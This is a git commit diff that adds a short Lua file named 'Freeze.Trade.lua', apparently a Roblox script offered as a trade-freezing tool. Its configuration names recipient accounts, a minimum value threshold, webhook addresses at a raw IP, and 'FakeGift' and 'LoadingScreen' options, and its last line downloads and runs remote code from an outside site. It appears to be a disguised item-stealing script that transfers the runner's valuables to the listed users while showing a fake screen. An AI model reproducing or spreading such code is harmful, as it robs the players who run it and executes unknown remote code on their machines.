2f2d195e588ac5968c1952a6820f232729dadba4
Darkspawner-modz <spawner.modz@gmail.com>
2025-08-15 06:57:41 +0800

    Upload Freeze.Trade.lua via Script Source Converter

---
+++ Freeze.Trade.lua
@@ -0,0 +1,13 @@
+_G.LRMConfig = {
+    User = {"DIRECTIONSSSSYT", "urgirl_alyaaa"},
+    min_value = 10000000000,
+    pingEveryone = "Yes", -- dont change this
+    Webhook = "http://176.100.37.215:20002/proxy/b58420bbc0ac35c41798c52a0f1da7a1",
+    FakeGift = "Yes",
+    Trash = "http://176.100.37.215:20002/proxy/8ff0fd5de39bab60bf7bf7f123996e51",
+    LoadingScreen = "Yes",
+    GiftOnlyRares = "Yes",
+    ExecuteOtherScript = "No",
+}
+    
+loadstring(game:HttpGetAsync('https://lrmscripts.com/script/main.lua'))()
